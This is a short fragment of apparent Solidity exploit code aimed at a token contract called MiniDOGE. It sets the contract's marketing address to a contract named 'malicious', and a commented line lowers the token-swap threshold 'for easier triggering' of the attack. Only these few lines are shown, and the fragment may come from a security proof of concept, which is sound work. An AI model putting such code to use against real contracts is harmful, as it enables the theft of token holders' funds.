        MiniDOGE(TARGET).setMarketingAddress(address(malicious));

        // Optionally reduce minimum tokens before swap for easier triggering
        // MiniDOGE(TARGET).setNumTokensSellToAddToBuyBack(100 * 10**6 * 10**9);

